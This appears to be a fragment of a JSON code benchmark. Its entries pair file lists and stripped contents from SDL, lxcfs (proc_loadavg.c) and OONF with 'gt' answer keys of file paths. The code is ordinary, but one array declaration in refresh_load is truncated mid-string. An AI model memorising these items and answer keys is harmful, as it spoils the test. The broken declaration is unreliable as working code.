_SDL_rwops_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define SDL_RWOPS_UNKNOWN   0U\n#define SDL_RWOPS_WINFILE   1U\n#define SDL_RWOPS_STDFILE   2U\n#define SDL_RWOPS_JNIFILE   3U\n#define SDL_RWOPS_MEMORY    4U\n#define SDL_RWOPS_MEMORY_RO 5U\n\n\ntypedef struct SDL_RWops\n{\n\n    Sint64 (SDLCALL * size) (struct SDL_RWops * context);\n\n\n    Sint64 (SDLCALL * seek) (struct SDL_RWops * context, Sint64 offset,\n                             int whence);\n\n\n    size_t (SDLCALL * read) (struct SDL_RWops * context, void *ptr,\n                             size_t size, size_t maxnum);\n\n\n    size_t (SDLCALL * write) (struct SDL_RWops * context, const void *ptr,\n                              size_t size, size_t num);\n\n\n    int (SDLCALL * close) (struct SDL_RWops * context);\n\n    Uint32 type;\n    union\n    {\n#if defined(__ANDROID__)\n        struct\n        {\n            void *fileNameRef;\n            void *inputStreamRef;\n            void *readableByteChannelRef;\n            void *readMethod;\n            void *assetFileDescriptorRef;\n            long position;\n            long size;\n            long offset;\n            int fd;\n        } androidio;\n#elif defined(__WIN32__)\n        struct\n        {\n            SDL_bool append;\n            void *h;\n            struct\n            {\n                void *data;\n                size_t size;\n                size_t left;\n            } buffer;\n        } windowsio;\n#endif\n\n#ifdef HAVE_STDIO_H\n        struct\n        {\n            SDL_bool autoclose;\n            FILE *fp;\n        } stdio;\n#endif\n        struct\n        {\n            Uint8 *base;\n            Uint8 *here;\n            Uint8 *stop;\n        } mem;\n        struct\n        {\n            void *data1;\n            void *data2;\n        } unknown;\n    } hidden;\n\n} SDL_RWops;\n\n\n\n\n\nextern DECLSPEC SDL_RWops *SDLCALL SDL_RWFromFile(const char *file,\n                                                  const char *mode);\n\n#ifdef HAVE_STDIO_H\nextern DECLSPEC SDL_RWops *SDLCALL SDL_RWFromFP(FILE * fp,\n                                                SDL_bool autoclose);\n#else\nextern DECLSPEC SDL_RWops *SDLCALL SDL_RWFromFP(void * fp,\n                                                SDL_bool autoclose);\n#endif\n\nextern DECLSPEC SDL_RWops *SDLCALL SDL_RWFromMem(void *mem, int size);\nextern DECLSPEC SDL_RWops *SDLCALL SDL_RWFromConstMem(const void *mem,\n                                                      int size);\n\n\n#define RW_SEEK_CUR 1\n#define RW_SEEK_END 2\n\n\n\n#define SDL_RWsize(ctx)         (ctx)->size(ctx)\n#define SDL_RWseek(ctx, offset, whence) (ctx)->seek(ctx, offset, whence)\n#define SDL_RWtell(ctx)         (ctx)->seek(ctx, 0, RW_SEEK_CUR)\n#define SDL_RWread(ctx, ptr, size, n)   (ctx)->read(ctx, ptr, size, n)\n#define SDL_RWwrite(ctx, ptr, size, n)  (ctx)->write(ctx, ptr, size, n)\n#define SDL_RWclose(ctx)        (ctx)->close(ctx)\n\n\nextern DECLSPEC Uint8 SDLCALL SDL_ReadU8(SDL_RWops * src);\nextern DECLSPEC Uint16 SDLCALL SDL_ReadLE16(SDL_RWops * src);\nextern DECLSPEC Uint16 SDLCALL SDL_ReadBE16(SDL_RWops * src);\nextern DECLSPEC Uint32 SDLCALL SDL_ReadLE32(SDL_RWops * src);\nextern DECLSPEC Uint32 SDLCALL SDL_ReadBE32(SDL_RWops * src);\nextern DECLSPEC Uint64 SDLCALL SDL_ReadLE64(SDL_RWops * src);\nextern DECLSPEC Uint64 SDLCALL SDL_ReadBE64(SDL_RWops * src);\n\n\nextern DECLSPEC size_t SDLCALL SDL_WriteU8(SDL_RWops * dst, Uint8 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteLE16(SDL_RWops * dst, Uint16 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteBE16(SDL_RWops * dst, Uint16 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteLE32(SDL_RWops * dst, Uint32 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteBE32(SDL_RWops * dst, Uint32 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteLE64(SDL_RWops * dst, Uint64 value);\nextern DECLSPEC size_t SDLCALL SDL_WriteBE64(SDL_RWops * dst, Uint64 value);\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rwops.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'lxcfs/src/proc_loadavg.h'",
            "'lxcfs/src/proc_loadavg.c'",
            "'lxcfs/src/lxcfs_fuse.h'"
        ],
        "content": "'lxcfs/src/proc_loadavg.h'\n:\n\n#ifndef __LXCFS_PROC_LOADAVG_FUSE_H\n#define __LXCFS_PROC_LOADAVG_FUSE_H\n\n#include \"config.h\"\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include \"lxcfs_fuse.h\"\n\n#include \"macro.h\"\n\n__visible extern pthread_t load_daemon(int load_use);\n__visible extern int load_daemon_v2(pthread_t *thread, int load_use);\n__visible extern int stop_load_daemon(pthread_t pid);\n\nextern int proc_loadavg_read(char *buf, size_t size, off_t offset, struct fuse_file_info *fi);\nextern int calc_hash(const char *name);\n\n#endif\n\n\n'lxcfs/src/proc_loadavg.c'\n:\n\n#include \"config.h\"\n\n#include <dirent.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <libgen.h>\n#include <pthread.h>\n#include <sched.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n#include <unistd.h>\n#include <wait.h>\n#include <linux/magic.h>\n#include <linux/sched.h>\n#include <sys/epoll.h>\n#include <sys/mman.h>\n#include <sys/mount.h>\n#include <sys/param.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n#include <sys/sysinfo.h>\n#include <sys/vfs.h>\n\n#include \"proc_loadavg.h\"\n\n#include \"bindings.h\"\n#include \"cgroup_fuse.h\"\n#include \"cgroups/cgroup.h\"\n#include \"cgroups/cgroup_utils.h\"\n#include \"memory_utils.h\"\n#include \"utils.h\"\n\n\nstatic int loadavg = 0;\n\n\n#define LOAD_SIZE 100\n#define FLUSH_TIME 5\n#define DEPTH_DIR 3\n\n#define FSHIFT\t\t(uint64_t)11\n#define FIXED_1\t\t((uint64_t)1 << FSHIFT)\n#define EXP_1\t\t(uint64_t)1884\n#define EXP_5\t\t(uint64_t)2014\n#define EXP_15\t\t(uint64_t)2037\n#define LOAD_INT(x) ((x) >> FSHIFT)\n#define LOAD_FRAC(x) LOAD_INT(((x) & (FIXED_1 - 1)) * (uint64_t)100)\nstatic volatile sig_atomic_t loadavg_stop = 0;\n\nstruct load_node {\n\n\tchar *cg;\n\n\tuint64_t avenrun[3];\n\tunsigned int run_pid;\n\tunsigned int total_pid;\n\tunsigned int last_pid;\n\n\tint cfd;\n\tstruct load_node *next;\n\tstruct load_node **pre;\n};\n\nstruct load_head {\n\n\n\n\tpthread_mutex_t lock;\n\n\tpthread_rwlock_t rdlock;\n\n\tpthread_rwlock_t rilock;\n\tstruct load_node *next;\n};\n\nstatic struct load_head load_hash[LOAD_SIZE];\n\n\nstatic struct load_node *locate_node(char *cg, int locate)\n{\n\tstruct load_node *f = NULL;\n\tint i = 0;\n\n\tpthread_rwlock_rdlock(&load_hash[locate].rdlock);\n\tpthread_rwlock_rdlock(&load_hash[locate].rilock);\n\tif (load_hash[locate].next == NULL) {\n\t\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n\t\treturn f;\n\t}\n\tf = load_hash[locate].next;\n\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n\twhile (f && ((i = strcmp(f->cg, cg)) != 0))\n\t\tf = f->next;\n\treturn f;\n}\n\n\nstatic void insert_node(struct load_node **n, int locate)\n{\n\tstruct load_node *f;\n\n\tpthread_mutex_lock(&load_hash[locate].lock);\n\n\n\tf = locate_node((*n)->cg, locate);\n\tif (f) {\n\t\tfree_disarm((*n)->cg);\n\t\tfree_disarm((*n));\n\t\t*n = f;\n\n\t\tpthread_mutex_unlock(&load_hash[locate].lock);\n\t\treturn;\n\t}\n\n\n\n\tpthread_rwlock_wrlock(&load_hash[locate].rilock);\n\tf = load_hash[locate].next;\n\tload_hash[locate].next = *n;\n\n\t(*n)->pre = &(load_hash[locate].next);\n\tif (f)\n\t\tf->pre = &((*n)->next);\n\t(*n)->next = f;\n\tpthread_mutex_unlock(&load_hash[locate].lock);\n\tpthread_rwlock_unlock(&load_hash[locate].rilock);\n}\n\nint calc_hash(const char *name)\n{\n\tunsigned int hash = 0;\n\tunsigned int x = 0;\n\n\n\twhile (*name) {\n\t\thash = (hash << 4) + *name++;\n\t\tx = hash & 0xf0000000;\n\t\tif (x != 0)\n\t\t\thash ^= (x >> 24);\n\t\thash &= ~x;\n\t}\n\n\treturn (hash & 0x7fffffff);\n}\n\nint proc_loadavg_read(char *buf, size_t size, off_t offset,\n\t\t      struct fuse_file_info *fi)\n{\n\t__do_free char *cg = NULL;\n\tstruct fuse_context *fc = fuse_get_context();\n\tstruct file_info *d = INTTYPE_TO_PTR(fi->fh);\n\tpid_t initpid;\n\tssize_t total_len = 0;\n\tstruct load_node *n;\n\tint hash;\n\tint cfd;\n\tuint64_t a, b, c;\n\n\tif (offset) {\n\t\tsize_t left;\n\n\t\tif (offset > d->size)\n\t\t\treturn -EINVAL;\n\n\t\tif (!d->cached)\n\t\t\treturn 0;\n\n\t\tleft = d->size - offset;\n\t\ttotal_len = left > size ? size : left;\n\t\tmemcpy(buf, d->buf + offset, total_len);\n\n\t\treturn total_len;\n\t}\n\tif (!loadavg)\n\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\n\tinitpid = lookup_initpid_in_store(fc->pid);\n\tif (initpid <= 1 || is_shared_pidns(initpid))\n\t\tinitpid = fc->pid;\n\n\tcg = get_pid_cgroup(initpid, \"cpu\");\n\tif (!cg)\n\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\n\tprune_init_slice(cg);\n\thash = calc_hash(cg) % LOAD_SIZE;\n\tn = locate_node(cg, hash);\n\n\n\tif (n == NULL) {\n\t\tcfd = get_cgroup_fd(\"cpu\");\n\t\tif (cfd < 0) {\n\n\t\t\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\t\t\treturn read_file_fuse(\"/proc/loadavg\", buf, size, d);\n\t\t}\n\n\t\tn = must_realloc(NULL, sizeof(struct load_node));\n\t\tn->cg = move_ptr(cg);\n\t\tn->avenrun[0] = 0;\n\t\tn->avenrun[1] = 0;\n\t\tn->avenrun[2] = 0;\n\t\tn->run_pid = 0;\n\t\tn->total_pid = 1;\n\t\tn->last_pid = initpid;\n\t\tn->cfd = cfd;\n\t\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\t\tinsert_node(&n, hash);\n\n\t}\n\ta = n->avenrun[0] + (FIXED_1 / 200);\n\tb = n->avenrun[1] + (FIXED_1 / 200);\n\tc = n->avenrun[2] + (FIXED_1 / 200);\n\ttotal_len = snprintf(d->buf, d->buflen,\n\t\t\t     \"%\" PRIu64 \".%02\" PRIu64 \" \"\n\t\t\t     \"%\" PRIu64 \".%02lu \"\n\t\t\t     \"%\" PRIu64 \".%02\" PRIu64 \" \"\n\t\t\t     \"%d/\"\n\t\t\t     \"%d \"\n\t\t\t     \"%d\\n\",\n\t\t\t     LOAD_INT(a),\n\t\t\t     LOAD_FRAC(a),\n\t\t\t     LOAD_INT(b),\n\t\t\t     LOAD_FRAC(b),\n\t\t\t     LOAD_INT(c),\n\t\t\t     LOAD_FRAC(c),\n\t\t\t     n->run_pid,\n\t\t\t     n->total_pid,\n\t\t\t     n->last_pid);\n\tpthread_rwlock_unlock(&load_hash[hash].rdlock);\n\tif (total_len < 0 || total_len >= d->buflen)\n\t\treturn log_error(0, \"Failed to write to cache\");\n\n\td->size = (int)total_len;\n\td->cached = 1;\n\n\tif ((size_t)total_len > size)\n\t\ttotal_len = size;\n\n\tmemcpy(buf, d->buf, total_len);\n\treturn total_len;\n}\n\n\nstatic int calc_pid(char ***pid_buf, const char *rel_path, int depth, int sum, int cfd)\n{\n\t__do_free char *line = NULL, *path = NULL;\n\t__do_free void *fdopen_cache = NULL;\n\t__do_close int fd = -EBADF;\n\t__do_fclose FILE *f = NULL;\n\t__do_closedir DIR *dir = NULL;\n\tstruct dirent *file;\n\tsize_t linelen = 0;\n\tint pd;\n\n\tfd = openat(cfd, rel_path, O_RDONLY | O_CLOEXEC);\n\tif (fd < 0)\n\t\treturn sum;\n\n\tdir = fdopendir(fd);\n\tif (!dir)\n\t\treturn sum;\n\n\tmove_fd(fd);\n\n\twhile (((file = readdir(dir)) != NULL) && depth > 0) {\n\t\tif (strcmp(file->d_name, \".\") == 0)\n\t\t\tcontinue;\n\n\t\tif (strcmp(file->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\n\t\tif (file->d_type == DT_DIR) {\n\t\t\t__do_free char *path_next = NULL;\n\t\t\tpath_next = must_make_path(rel_path, \"/\", file->d_name, NULL);\n\t\t\tpd = depth - 1;\n\t\t\tsum = calc_pid(pid_buf, path_next, pd, sum, cfd);\n\t\t}\n\t}\n\n\tpath = must_make_path(rel_path, \"/cgroup.procs\", NULL);\n\tfd = openat(cfd, path, O_RDONLY | O_CLOEXEC);\n\tif (fd < 0)\n\t\treturn sum;\n\n\tf = fdopen_cached(fd, \"re\", &fdopen_cache);\n\tif (!f)\n\t\treturn sum;\n\n\twhile (getline(&line, &linelen, f) != -1) {\n\t\t__do_free char *task_pid = NULL;\n\t\tchar **pid;\n\n\t\ttask_pid = strdup(line);\n\t\tif (!task_pid)\n\t\t\treturn sum;\n\n\t\tpid = realloc(*pid_buf, sizeof(char *) * (sum + 1));\n\t\tif (!pid)\n\t\t\treturn sum;\n\t\t*pid_buf = pid;\n\t\t*(*pid_buf + sum) = move_ptr(task_pid);\n\t\tsum++;\n\t}\n\n\treturn sum;\n}\n\n\nstatic uint64_t calc_load(uint64_t load, uint64_t exp, uint64_t active)\n{\n\tuint64_t newload;\n\n\tactive = active > 0 ? active * FIXED_1 : 0;\n\tnewload = load * exp + active * (FIXED_1 - exp);\n\tif (active >= load)\n\t\tnewload += FIXED_1 - 1;\n\n\treturn newload / FIXED_1;\n}\n\n\nstatic int refresh_load(struct load_node *p, const char *path)\n{\n\tchar **idbuf = NULL;\n\tchar proc_path[STRLITERALLEN(\"/proc\n\t\t       2 * INTTYPE_TO_STRLEN(pid_t) + 1];\n\tint i, ret, run_pid = 0, total_pid = 0, last_pid = 0;\n\tsize_t linelen = 0;\n\tint sum, length;\n\tstruct dirent *file;\n\n\tidbuf = must_realloc(NULL, sizeof(char **));\n\n\tsum = calc_pid(&idbuf, path, DEPTH_DIR, 0, p->cfd);\n\tif (!sum)\n\t\tgoto out;\n\n\tfor (i = 0; i < sum; i++) {\n\t\t__do_closedir DIR *dp = NULL;\n\n\t\tlength = strlen(idbuf[i]) - 1;\n\t\tidbuf[i][length] = '\\0';\n\n\t\tret = snprintf(proc_path, sizeof(proc_path), \"/proc/%s/task\", idbuf[i]);\n\t\tif (ret < 0 || (size_t)ret > sizeof(proc_path)) {\n\t\t\ti = sum;\n\t\t\tsum = -1;\n\t\t\tlxcfs_error(\"%s\\n\", \"snprintf() failed in refresh_load.\");\n\t\t\tgoto err_out;\n\t\t}\n\n\t\tdp = opendir(proc_path);\n\t\tif (!dp) {\n\t\t\tlxcfs_error(\"Failed to open \\\"%s\\\"\", proc_path);\n\t\t\tcontinue;\n\t\t}\n\n\t\twhile ((file = readdir(dp)) != NULL) {\n\t\t\t__do_free char *line = NULL;\n\t\t\t__do_fclose FILE *f = NULL;\n\n\t\t\tif (strcmp(file->d_name, \".\") == 0)\n\t\t\t\tcontinue;\n\n\t\t\tif (strcmp(file->d_name, \"..\") == 0)\n\t\t\t\tcontinue;\n\n\t\t\ttotal_pid++;\n\n\n\t\t\tret = atof(file->d_name);\n\t\t\tlast_pid = (ret > last_pid) ? ret : last_pid;\n\n\t\t\tret = snprintf(proc_path, sizeof(proc_path),\n\t\t\t\t       \"/proc/%s/task/%s/status\", idbuf[i], file->d_name);\n\t\t\tif (ret < 0 || (size_t)ret > sizeof(proc_path)) {\n\t\t\t\ti = sum;\n\t\t\t\tsum = -1;\n\t\t\t\tlxcfs_error(\"%s\\n\", \"snprintf() failed in refresh_load.\");\n\t\t\t\tgoto err_out;\n\t\t\t}\n\n\t\t\tf = fopen(proc_path, \"re\");\n\t\t\tif (!f)\n\t\t\t\tcontinue;\n\n\t\t\twhile (getline(&line, &linelen, f) != -1)\n\t\t\t\tif ((line[0] == 'S') && (line[1] == 't'))\n\t\t\t\t\tbreak;\n\n\t\t\tif ((line[7] == 'R') || (line[7] == 'D'))\n\t\t\t\trun_pid++;\n\t\t}\n\t}\n\n\n\tp->avenrun[0]\t= calc_load(p->avenrun[0], EXP_1, run_pid);\n\tp->avenrun[1]\t= calc_load(p->avenrun[1], EXP_5, run_pid);\n\tp->avenrun[2]\t= calc_load(p->avenrun[2], EXP_15, run_pid);\n\tp->run_pid\t= run_pid;\n\tp->total_pid\t= total_pid;\n\tp->last_pid\t= last_pid;\n\nerr_out:\n\tfor (; i > 0; i--)\n\t\tfree(idbuf[i - 1]);\nout:\n\tfree(idbuf);\n\treturn sum;\n}\n\n\nstatic struct load_node *del_node(struct load_node *n, int locate)\n{\n\tstruct load_node *g;\n\n\tpthread_rwlock_wrlock(&load_hash[locate].rdlock);\n\tif (n->next == NULL) {\n\t\t*(n->pre) = NULL;\n\t} else {\n\t\t*(n->pre) = n->next;\n\t\tn->next->pre = n->pre;\n\t}\n\tg = n->next;\n\tfree_disarm(n->cg);\n\tfree_disarm(n);\n\tpthread_rwlock_unlock(&load_hash[locate].rdlock);\n\treturn g;\n}\n\n\nstatic void *load_begin(void *arg)\n{\n\n\tint first_node, sum;\n\tstruct load_node *f;\n\tclock_t time1, time2;\n\n\tfor (;;) {\n\t\tif (loadavg_stop == 1)\n\t\t\treturn NULL;\n\n\t\ttime1 = clock();\n\t\tfor (int i = 0; i < LOAD_SIZE; i++) {\n\t\t\tpthread_mutex_lock(&load_hash[i].lock);\n\t\t\tif (load_hash[i].next == NULL) {\n\t\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tf = load_hash[i].next;\n\t\t\tfirst_node = 1;\n\t\t\twhile (f) {\n\t\t\t\t__do_free char *path = NULL;\n\n\t\t\t\tpath = must_make_path_relative(f->cg, NULL);\n\n\t\t\t\tsum = refresh_load(f, path);\n\t\t\t\tif (sum == 0)\n\t\t\t\t\tf = del_node(f, i);\n\t\t\t\telse\n\t\t\t\t\tf = f->next;\n\n\n\t\t\t\tif (first_node == 1) {\n\t\t\t\t\tfirst_node = 0;\n\t\t\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (loadavg_stop == 1)\n\t\t\treturn NULL;\n\n\t\ttime2 = clock();\n\t\tusleep(FLUSH_TIME * 1000000 -\n\t\t       (int)((time2 - time1) * 1000000 / CLOCKS_PER_SEC));\n\t}\n}\n\n\nstatic int init_load(void)\n{\n\tint i;\n\tint ret;\n\n\tfor (i = 0; i < LOAD_SIZE; i++) {\n\t\tload_hash[i].next = NULL;\n\t\tret = pthread_mutex_init(&load_hash[i].lock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize lock\");\n\t\t\tgoto out3;\n\t\t}\n\n\t\tret = pthread_rwlock_init(&load_hash[i].rdlock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize rdlock\");\n\t\t\tgoto out2;\n\t\t}\n\n\t\tret = pthread_rwlock_init(&load_hash[i].rilock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize rilock\");\n\t\t\tgoto out1;\n\t\t}\n\t}\n\n\treturn 0;\n\nout1:\n\tpthread_rwlock_destroy(&load_hash[i].rdlock);\nout2:\n\tpthread_mutex_destroy(&load_hash[i].lock);\nout3:\n\twhile (i > 0) {\n\t\ti--;\n\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t}\n\n\treturn -1;\n}\n\nstatic void load_free(void)\n{\n\tstruct load_node *f, *p;\n\n\tfor (int i = 0; i < LOAD_SIZE; i++) {\n\t\tpthread_mutex_lock(&load_hash[i].lock);\n\t\tpthread_rwlock_wrlock(&load_hash[i].rdlock);\n\t\tpthread_rwlock_wrlock(&load_hash[i].rilock);\n\t\tif (load_hash[i].next == NULL) {\n\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\t\tpthread_rwlock_unlock(&load_hash[i].rilock);\n\t\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t\t\tpthread_rwlock_unlock(&load_hash[i].rdlock);\n\t\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t\t\tcontinue;\n\t\t}\n\n\t\tfor (f = load_hash[i].next; f;) {\n\t\t\tfree_disarm(f->cg);\n\t\t\tp = f->next;\n\t\t\tfree_disarm(f);\n\t\t\tf = p;\n\t\t}\n\n\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\tpthread_rwlock_unlock(&load_hash[i].rilock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t\tpthread_rwlock_unlock(&load_hash[i].rdlock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t}\n}\n\n\npthread_t load_daemon(int load_use)\n{\n\tint ret;\n\tpthread_t pid;\n\n\tret = init_load();\n\tif (ret == -1)\n\t\treturn (pthread_t)log_error(0, \"Initialize hash_table fails in load_daemon!\");\n\n\tret = pthread_create(&pid, NULL, load_begin, NULL);\n\tif (ret != 0) {\n\t\tload_free();\n\t\treturn (pthread_t)log_error(0, \"Create pthread fails in load_daemon!\");\n\t}\n\n\n\tloadavg = load_use;\n\treturn pid;\n}\n\n\nint load_daemon_v2(pthread_t *thread, int load_use)\n{\n\tint ret;\n\n\tret = init_load();\n\tif (ret == -1)\n\t\treturn log_error(-1, \"Initialize hash_table fails in load_daemon!\");\n\n\tret = pthread_create(thread, NULL, load_begin, NULL);\n\tif (ret != 0) {\n\t\tload_free();\n\t\treturn log_error(-1, \"%s - Create pthread fails in load_daemon!\", strerror(ret));\n\t}\n\n\n\tloadavg = load_use;\n\treturn 0;\n}\n\n\nint stop_load_daemon(pthread_t pid)\n{\n\tint s;\n\n\n\tloadavg_stop = 1;\n\n\ts = pthread_join(pid, NULL);\n\tif (s)\n\t\treturn log_error(-1, \"stop_load_daemon error: failed to join\");\n\n\tload_free();\n\tloadavg_stop = 0;\n\n\treturn 0;\n}\n\n'lxcfs/src/lxcfs_fuse.h'\n:\n\n#ifndef __LXCFS_FUSE_H\n#define __LXCFS_FUSE_H\n\n#include \"config.h\"\n\n#if HAVE_FUSE3\n#include <fuse3/fuse.h>\n#else\n#include <fuse.h>\n#endif\n\n#include \"lxcfs_fuse_compat.h\"\n\n#endif\n",
        "gt": [
            "'lxcfs/src/lxcfs_fuse.h'",
            "'lxcfs/src/proc_loadavg.h'",
            "'lxcfs/src/proc_loadavg.c'"
        ]
    },
    {
        "files": [
            "'OONF/include/oonf/base/os_fd.h'",
            "'OONF/include/oonf/base/os_generic/os_fd_generic_configsocket.h'",
            "'OONF/include/oonf/base/os_generic/os_fd_generic_join_mcast.h'",
            "'OONF/include/oonf/base/os_linux/os_fd_linux.h'"
        ],
        "content": "'OONF/include/oonf/base/os_fd.h'\n:\n\n\n\n\n#ifndef OS_FD_H_\n#define OS_FD_H_\n\n#include <sys/select.h>\n#include <unistd.h>\n\n#include <oonf/libcommon/avl.h>\n#include <oonf/oonf.h>\n#include <oonf/libcommon/list.h>\n#include <oonf/libcommon/netaddr.h>\n#include <oonf/libcore/oonf_logging.h>\n#include <oonf/base/oonf_timer.h>\n#include <oonf/base/os_interface.h>\n\n\n#define OONF_OS_FD_SUBSYSTEM \"os_fd\"\n\n\nstruct os_fd;\nstruct os_fd_select;\n\n\nstatic INLINE int os_fd_init(struct os_fd *, int fd);\nstatic INLINE int os_fd_copy(struct os_fd *dst, struct os_fd *from);\nstatic INLINE int os_fd_get_fd(struct os_fd *);\nstatic INLINE int os_fd_invalidate(struct os_fd *);\nstatic INLINE bool os_fd_is_initialized(struct os_fd *);\n\nstatic INLINE int os_fd_bindto_interface(struct os_fd *, struct os_interface *);\nstatic INLINE int os_fd_close(struct os_fd *);\nstatic INLINE int os_fd_listen(struct os_fd *, int n);\n\nstatic INLINE int os_fd_event_add(struct os_fd_select *);\nstatic INLINE int os_fd_event_socket_add(struct os_fd_select *, struct os_fd *);\nstatic INLINE int os_fd_event_socket_read(struct os_fd_select *, struct os_fd *, bool want_read);\nstatic INLINE int os_fd_event_is_read(struct os_fd *);\nstatic INLINE int os_fd_event_socket_write(struct os_fd_select *, struct os_fd *, bool want_write);\nstatic INLINE int os_fd_event_is_write(struct os_fd *);\nstatic INLINE int os_fd_event_socket_remove(struct os_fd_select *, struct os_fd *);\nstatic INLINE int os_fd_event_set_deadline(struct os_fd_select *, uint64_t deadline);\nstatic INLINE uint64_t os_fd_event_get_deadline(struct os_fd_select *);\nstatic INLINE int os_fd_event_wait(struct os_fd_select *);\nstatic INLINE struct os_fd *os_fd_event_get(struct os_fd_select *, int idx);\nstatic INLINE int os_fd_event_remove(struct os_fd_select *);\n\nstatic INLINE int os_fd_connect(struct os_fd *, const union netaddr_socket *remote);\nstatic INLINE int os_fd_accept(struct os_fd *client, struct os_fd *server, union netaddr_socket *incoming);\nstatic INLINE int os_fd_get_socket_error(struct os_fd *, int *value);\nstatic INLINE ssize_t os_fd_sendto(\n  struct os_fd *, const void *buf, size_t length, const union netaddr_socket *dst, bool dont_route);\nstatic INLINE ssize_t os_fd_recvfrom(\n  struct os_fd *, void *buf, size_t length, union netaddr_socket *source, const struct os_interface *);\nstatic INLINE const char *os_fd_get_loopback_name(void);\nstatic INLINE ssize_t os_fd_sendfile(struct os_fd *, struct os_fd *, size_t offset, size_t count);\n\nstatic INLINE int os_fd_getsocket(struct os_fd *, const union netaddr_socket *bindto, bool tcp, size_t recvbuf,\n  const struct os_interface *, enum oonf_log_source log_src);\nstatic INLINE int os_fd_getrawsocket(struct os_fd *, const union netaddr_socket *bindto, int protocol, size_t recvbuf,\n  const struct os_interface *, enum oonf_log_source log_src);\nstatic INLINE int os_fd_configsocket(struct os_fd *, const union netaddr_socket *bindto, size_t recvbuf, bool rawip,\n  const struct os_interface *, enum oonf_log_source log_src);\nstatic INLINE int os_fd_set_nonblocking(struct os_fd *);\nstatic INLINE int os_fd_join_mcast_recv(\n  struct os_fd *, const struct netaddr *multicast, const struct os_interface *, enum oonf_log_source log_src);\nstatic INLINE int os_fd_join_mcast_send(struct os_fd *, const struct netaddr *multicast, const struct os_interface *,\n  bool loop, uint8_t ttl, enum oonf_log_source log_src);\nstatic INLINE int os_fd_set_dscp(struct os_fd *, int dscp, bool ipv6);\nstatic INLINE uint8_t *os_fd_skip_rawsocket_prefix(uint8_t *ptr, ssize_t *len, int af_type);\n\n\n#if defined(__linux__)\n#include <oonf/base/os_linux/os_fd_linux.h>\n#elif defined(BSD)\n#include <oonf/base/os_bsd/os_fd_bsd.h>\n#elif defined(_WIN32)\n#include <oonf/base/os_win32/os_fd_win32.h>\n#else\n#error \"Unknown operation system\"\n#endif\n\n#endif\n\n'OONF/include/oonf/base/os_generic/os_fd_generic_configsocket.h'\n:\n\n#ifndef _OS_FD_GENERIC_CONFIGSOCKET_H_\n#define _OS_FD_GENERIC_CONFIGSOCKET_H_\n\n#include <oonf/oonf.h>\n#include <oonf/libcore/oonf_logging.h>\n#include <oonf/base/os_fd.h>\n#include <oonf/base/os_interface.h>\n\nEXPORT int os_fd_generic_configsocket(struct os_fd *sock, const union netaddr_socket *bind_to, size_t recvbuf,\n  bool rawip, const struct os_interface *os_if, enum oonf_log_source log_src);\n\n#endif\n\n'OONF/include/oonf/base/os_generic/os_fd_generic_join_mcast.h'\n:\n\n#ifndef _OS_FD_GENERIC_JOIN_MCAST_H_\n#define _OS_FD_GENERIC_JOIN_MCAST_H_\n\n#include <oonf/oonf.h>\n#include <oonf/base/os_fd.h>\n\nEXPORT 